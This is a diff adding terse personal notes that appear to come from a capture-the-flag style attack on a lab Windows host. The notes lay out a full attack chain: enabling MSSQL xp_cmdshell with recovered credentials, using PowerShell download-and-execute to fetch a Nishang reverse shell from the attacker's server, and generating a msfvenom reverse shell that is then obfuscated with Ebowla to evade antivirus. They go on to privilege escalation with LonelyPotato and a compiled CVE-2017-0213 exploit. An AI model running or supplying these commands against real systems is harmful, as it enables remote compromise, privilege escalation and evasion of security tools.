@@ -9,6 +9,120 @@ keepass2john ./Time/Files/time.kdbx => hashcat
 
 mount -t cifs  -o username=Finance,password=accounting //10.10.10.59/ACCT /mnt/smb
 
+strings tester.exe --> find the mssql username and passwd
+
+sqsh -S 10.10.10.59 -U sa -P password
+xp_cmdshell 'whoami'
+exec sp_configure 'show advanced options', 1;
+reconfigure
+exec sp_configure 'xp_cmdshell',1
+reconfigure
+go
+
+xp_cmdshell "whoami";
+go
+xp_cmdshell "whoami /priv";
+go
+nishang:
+cp invoke-powershelltcp.ps1 to www
+
+rename to rev-9001.ps1
+xp_cmdshell "powershell iex(Net.Webclient).downloadString('http://ip/rev-9001.ps1')"
+go
+
+cd %HOME%
+get-content browser.bat
+Get-Content 
+echo "IEX(New-Object Net.webclient).downloadString(9002.ps1)" > SPBestWarmUp.ps1
+Get-Date
+
+powerup github
+
+git clone powerup -b dev
+
+iex(new-object net.webclient).downloadString(powerup.ps1)
+Invoke-AllChecks
+SeImperonatePrivilege --> Process Token Privileges
+
+
+google "foxglove security seimpersonate" 
+google rotten potato ng
+
+decoder.cloud about the privilege want to know about the rotten
+
+git clone lonelypotato
+
+cp MSFRottenPotato.exe to www
+rename to lonelypotato.exe
+github ebowla
+git clone Ebowla
+
+change the output type and payload  type
+hostname
+change the computername
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ip LPORT=9004  -f exe -a x64 -o shell-9004.exe
+
+python ebowla.py shell.exe --> output.exe.go
+./build_x64.go.sh  output.exe.go xxx.exe
+cp xxx.exe to www
+virustotal.com
+cp the xxx.exe to victim machine
+ftp upload ( remember binay )
+
+put ebowla.exe
+
+put lonelypotato.exe
+
+lonelypotato.exe * ebowla.exe (will execute the eboala.exe)
+
+another way through 
+
+cp sherlock.ps1 to www
+
+IEX(IWR('10.10.14.2/Sherlock.ps1'))
+Find-AllVulns
+
+google windows github exploit
+
+install visaul 2015
+cd program files (x86) microsofot visual studio 14.0\Vc
+
+vcvarsall.bat amd64
+cd users\ipp\downloads
+cl CVE-2017-0213.cpp /EHsc -->  /DUNICODE /D_UNICODE
+
+add '#program comment(lib,"Advapi32.lib")'
+cl CVE-2017-0213.cpp /EHsc /DUNICODE /D_UNICODE
+
+it call cmd.exe ,but we want to call something.exe 
+
+ftp upload the cve-2017-0213.exe
+put ebowal-shyell-9004.exe    something.exe
+
+anothway
+
+python unicor.py --revershell
+
+msfconsole execute the powload
+remember migrate to explore.exe
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
